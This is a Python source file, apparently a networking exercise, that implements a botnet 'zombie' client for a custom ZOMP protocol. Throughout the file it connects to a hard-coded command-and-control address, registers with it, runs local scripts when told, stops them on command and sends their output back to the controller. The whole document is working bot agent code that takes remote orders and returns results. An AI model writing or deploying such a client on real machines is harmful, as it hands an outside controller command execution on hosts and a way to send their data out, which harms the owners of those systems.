#!/usr/bin/env python3

from socket import *
from os import path, curdir
import multiprocessing
import subprocess
from copy import copy

ZOMP_PORT = 1932
CNC_HOST = '10.14.1.68' # fill out later; for now using localhost

READY_MSG = "ZOMP/1.0 00 Ready to be registered\r\n\r\n"

class ZOMPRequestBuffer(object):
    def __init__(self):
        self.buf = ""
        self.signal = '\r\n\r\n' # end of header signal
        self.code = ""
        self.command = ""
        self.script_invocation = ""
        self.filepath = ""
        self.args: [str] = []
    def bufferMessages(self,sock):
        while True:
            data = sock.recv(1024)

            if len(data) == 0:
                return None
            
            self.buf += data.decode()

            signal_index = self.buf.find(self.signal)
            if signal_index != -1: # found end of header
                header = self.buf[:signal_index]
                print(header + "\n") # newline for readability
                self.buf = self.buf[signal_index+len(self.signal):]
                
                try:
                    request_line, *script_line = header.split('\r\n') # splitting along newlines and pulling first line out
                    version, code, command = request_line.strip().split(' ', 2)
                except ValueError:
                    print("Unpacking failed!")
                    sock.send(makeZOMPResponse("01", "Bad request"))
                    return None
                
                self.code = code
                self.command = command

                if code != "9" and code != "0" and not script_line:
                    sock.send(makeZOMPResponse("01", "Bad request")) # bad request: missing script
                    return None # we're done here

                match code:
                    case "9": # CLOSE, the C&C doesn't want us anymore!
                        print("CLOSE command received. Terminating.")
                        return None
                    case "5": # NOT UNDERSTOOD, just inform zombie and fail quietly
                        print("C&C did not understand. Not doing anything about it, though!")
                        # can do more error handling here if more advanced
                        return None
                    case "0": # ACCEPT, no need to do anything - return to listening
                        return None
                    case "1" | "2" | "3": # checking for script not found errors
                        self.script_invocation = " ".join(script_line)
                        self.args = self.script_invocation.split(" ")
                        scriptname = copy(self.args[0]) # not unpacking because we want the whole list also

                        self.args[0] = "./" + scriptname # making sure we can call it like executable
                        self.filepath = curdir + "/" + scriptname
                        # print("filepath", self.filepath)
                        # print("scriptname", scriptname)
                        if not path.exists(self.filepath):
                            sock.send(makeZOMPResponse("02", "Script not found"))
                            return None
                        
                return self.script_invocation # no real messages ever, so return this

def makeZOMPResponse(code: str, status_message: str, script_invocation="", report="", version="1.0"): # returns an encoded string because report is bytes
    response = (
        f"ZOMP/{version} {code} {status_message}\r\n".encode()
    )

    if not code.startswith("0"): # 0X codes are errors!
        response += (
            f"{script_invocation}\r\n"
            f"Content-Length: {len(report)}\r\n"
        ).encode()

    response += b"\r\n" # end of header

    if report:
        response += report
    
    # print(response)
    return response

def storeResult(script_invocation: str, args: [str], result_dict) -> None:
    result_dict[script_invocation] = subprocess.check_output(args)

def main():
    buffer = ZOMPRequestBuffer() # this is the signal that indicates end of header
    
    sock = socket(AF_INET, SOCK_STREAM)

    sock.connect((CNC_HOST, ZOMP_PORT))
    sock.send(READY_MSG.encode()) # get registered by C&C

    processes = {} # dictionary of processes: key is script invocation, value is process object
    manager = multiprocessing.Manager() # for sharing data between processes
    reports = manager.dict() # dictionary of reports: key is script invocation, value is report (string)

    while True:
        script_invocation = buffer.bufferMessages(sock)
        if script_invocation:
            match buffer.code: # at this point we know script must exist
                case "1": # RUN
                    if script_invocation in processes and processes[script_invocation].is_alive(): # if process is still running
                            sock.send(makeZOMPResponse("11", "Ignore, script already running", script_invocation))
                    else: # if process is dead (the dictionary should hold the output)
                        if script_invocation in reports:
                            sock.send(makeZOMPResponse("12", "OK, returning existing report", script_invocation, reports[script_invocation]))
                        else:
                            subprocess.run(["chmod", "+x", buffer.args[0]]) # making the script executable just in case
                            sock.send(makeZOMPResponse("10", "OK, running script", script_invocation))
                        print(f"Running {script_invocation}...")
                        processes[script_invocation] = multiprocessing.Process(target=storeResult, args=(script_invocation, buffer.args, reports))
                        processes[script_invocation].start()

                case "2": # STOP
                    if script_invocation in processes and processes[script_invocation].is_alive(): # time to stop this process
                            print(f"Stopping {script_invocation}...")
                            processes[script_invocation].terminate()
                            sock.send(makeZOMPResponse("20", "OK, stopping script", script_invocation))
                            del processes[script_invocation]
                    elif script_invocation in reports: # if process is dead (and dictionary has report)
                        sock.send(makeZOMPResponse("22", "Ignore, script completed running", script_invocation))
                    else: # if process is dead (and dictionary has no report)
                        sock.send(makeZOMPResponse("21", "Ignore, script not currently running", script_invocation))

                case "3": # REPORT
                    if script_invocation in processes:
                        if processes[script_invocation].is_alive():
                            sock.send(makeZOMPResponse("31", "No report, waiting on completion", script_invocation))
                        else: # if process is dead (the dictionary should hold the output)
                            print(f"Reporting on {script_invocation}...")
                            sock.send(makeZOMPResponse("30", "OK, reporting", script_invocation, reports[script_invocation]))
                    else:
                        sock.send(makeZOMPResponse("32", "No report, not running script", script_invocation))
        elif buffer.code == "9":
            for process in processes.values(): # kill all processes
                process.terminate()
            sock.close()
            exit(1)
            

if __name__ == '__main__':
    main()